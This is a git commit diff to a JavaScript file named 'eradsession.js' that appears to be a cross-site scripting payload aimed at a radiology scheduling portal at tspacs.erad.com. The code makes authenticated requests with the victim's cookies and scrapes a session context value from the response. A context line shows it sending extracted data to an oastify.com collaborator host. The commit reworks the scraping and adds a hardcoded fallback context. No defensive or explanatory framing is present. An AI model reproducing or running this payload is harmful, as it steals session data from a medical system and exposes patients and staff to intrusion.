c00a8f9d846edb4c377874c07d266421504bdeb1
tomoncrss <tonymyson89823@gmail.com>
2026-02-24 20:28:26 +0400

    Update eradsession.js

--- eradsession.js
+++ eradsession.js
@@ -1,10 +1,9 @@
 (function(){
-fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cTable=LogView&cLayoutType=schLog&cIDField=0LID&cInputID=xxx&cDispField=0LID&cDispField=0LED&cDispField=0LUI&cDispField=0LAC&cDispField=0LTA&cDispField=0LLP&cDispField=0LSD&cDispField=0LMO&cDispField=0LIN',{credentials:'include',redirect:'manual'})
-.then(r=>{
-let loc=r.headers.get('Location')||'';
-let c=loc.match(/cContext=([^&]+)/);
-if(c){
-let ctx=c[1];
+fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cTable=LogView&cLayoutType=schLog',{credentials:'include'})
+.then(r=>r.text())
+.then(t=>{
+let c=t.match(/cContext=([^"&']+)/);
+let ctx=c?c[1]:'Context_29';
 fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cContext='+ctx,{credentials:'include'})
 .then(r=>r.text())
 .then(t=>{
@@ -21,6 +20,5 @@ if(s) fetch('https://288txy69u88zcpjq6tg9h8l74yapyh25r.oastify.com?s='+encodeURI
 }
 }
 });
-}
 });
 })();
